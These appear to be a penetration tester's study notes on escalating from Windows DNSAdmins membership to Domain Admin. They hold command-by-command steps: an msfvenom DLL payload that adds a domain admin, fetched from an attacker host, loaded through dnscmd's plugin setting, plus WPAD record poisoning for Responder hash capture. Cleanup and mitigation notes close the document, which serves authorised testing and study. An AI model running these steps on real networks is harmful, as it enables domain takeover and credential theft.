	
DNS Service runs as system/NT Authority,  members of DNS admins  can load custom DLLs
. https://adsecurity.org/?p=4064
explores 
https://www.winhelponline.com/blog/view-edit-service-permissions-windows/
## Requirements
- Membership in the **DNSAdmins** group.
- Ability to **restart the DNS service** (or wait for a scheduled restart).
**note:** Membership in the DnsAdmins group doesn't give the ability to restart the DNS service, but this is conceivably something that sysadmins might permit DNS admins to do.
	- this is a potentially destructive attack that we should only carry out with explicit permission from and in coordination with our client. If they understand the risks and want to see a full proof of concept, then the steps outlined in this section will help demonstrate the attack and clean up afterward.
## exploit techniques:
- with permissions to restart DNS and DNSadmins membership: privesc to domain admins /root via pointing plugindll path to a malicious dll (best scenario)
- hijack wpad and isatap to poison requests with responder and capture ntlm hashes/ relay to other services
## exploit steps
#### scenario 1: PrivEsc to DA
1. Ensure you are in **DNSAdmins**. and you can **restart DNS service**
2. Place a **custom DLL** on a legit domain network share accessible by the DC. **(not your attacker's share)**
3. Set the DLL with `dnscmd.exe`.
4.  if it allows, **Restart DNS service** to trigger DLL load.
5. check DA group membership
## issues to consider

- **UNC path with dnscmd.exe** → only works if the **machine account** (`<hostname>$`) has rights to that share.
---
### `1. check current permissions and Access rights on DNS Service`

`check group membership`
```
net user <user> /dom
```

`_check access rights on the DNS service (SYSINTERNALS TOOL)`
```
psservice.exe security DNS
```
![[Pasted image 20250818141853.png]]

`generate payload (dll) that once triggered, it adds a user to Domain Admins with the execution context of NT Authority/system that the dns service runs as`
```shell
# generate dll
 msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll

# serve dll
smbserver.py -smb2support share-name $(pwd) -username scar -password PleaseSubscribe123
```

`copy dll file to local or place the dllfile in a legit smb share`
```
net use \\10.10.16.32  /user:scar ream

copy \\10.10.16.32\share\adduser.dll -o C:\Users\Public\Temp 

# (optional)  download  via web 
$ python3 -m http.server 7777
wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll
```

`Reconfigure serverlevelplugindll location to point to adduserdll`
```
#  m1. point to remote dll path (smb)
dnscmd.exe /config /serverlevelplugindll \\fileSRV01\<share>\adduser.dll
------------------------------------------------
# m2. point to local dll path 
dnscmd.exe /config /serverlevelplugindll C:\Users\Public\Temp\adduser.dll
```

 `restart DNS Service`
```
sc.exe stop DNS
sc.exe query DNS #check state
sc.exe start DNS
```
#### **issues:** 
1. `dns service wont start after running sc start`, that might be caused by the dns service not being able to access the smb share due to the service being local 
2. in serious domain scenairos the dns service may run by a seperate account called dns-svc for the specific domain.
- **solution**: try serving the `.dll` payload locally.
---
 confirm our user was added to domain admins
`confirm domain Admin user added`
```cmd-session
net group "Domain Admins" /dom
```
---
## other methods:

## Abuse Technique 2: malicious DNS Records to perform a traffic spoofing attack

### creating WPAD records:

- Membership in dnsadmins group gives us the rights to [disable global query block security](https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps), which by default blocks this attack The **Global Query Block List** is a security feature in Windows DNS Server that blocks certain **“high-risk” DNS names** from being registered/queried in the domain.
	- wpad, isatap, these protocols are quite vulnerable to hijacking, and any domain user can create a computer object or DNS record containing those names. and then proxy user requests through attacker
	- We could use a tool such as [Responder](https://github.com/lgandx/Responder) or [Inveigh](https://github.com/Kevin-Robertson/Inveigh) to perform traffic spoofing, and attempt to capture password hashes and crack them offline or perform an SMBRelay attack.

#### Disabling the Global Query Block List
```powershell-session
C:\htb> Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.blackwood.local
```

#### Adding a WPAD Record
```powershell
Add-DnsServerResourceRecordA -Name wpad -ZoneName blackwood.local -ComputerName dc01.blackwood.local -IPv4Address <attacker-ip>
```

now run responder
```
responder -I IFNAME
```
---
### What is the Global Query Block List?

The **global query block list** is a security feature on a DNS server that prevents it from resolving certain names known to be vulnerable to hijacking. By default, this list includes:

	- **WPAD** (Web Proxy Automatic Discovery Protocol)
	- **ISATAP** (Intra-site Automatic Tunnel Addressing Protocol)
### abuse technique 3:
blog that explains another attack vector where you can edit sourcecode for mimikat dll
and get a reverse shell https://academy.hackthebox.com/module/67/section/603

### cleanup

`Confirm registery key exists:`
```cmd-session
reg query \\dc-ip/hostname>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters

    ServerLevelPluginDll    REG_SZ    adduser.dll
```

`delete key`
```cmd-session
reg delete  \\dc-ip/hostname>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll
```

`start service`
```cmd-session
sc.exe start dns
```

---
## side notes
### What is WPAD, and Why Does It Matter?

WPAD is a protocol used by clients (like web browsers) to automatically locate a proxy configuration file (e.g., wpad.dat). When a client is set to "auto-detect proxy settings" (common in corporate environments), it queries DNS for a record like wpad.<domain> (e.g., wpad.blackwood.local). If the DNS server resolves this query, the client fetches the proxy configuration from the IP address returned.

By default, the global query block list prevents these queries from being resolved to protect against attackers setting up malicious WPAD records. However, if you have DnsAdmins privileges, you can bypass this protection.
# Mitigation
- Ensure only admin accounts are members of the DNSAdmins group and ensure they only administer DNS from admin systems. Include DNSAdmins in the list of groups that membership is carefully scrutinized.
- Regularly review the DNS server object permissions for any group/account that shouldn’t have privileged access.
- Restrict RPC communication to DCs to only admin subnets.

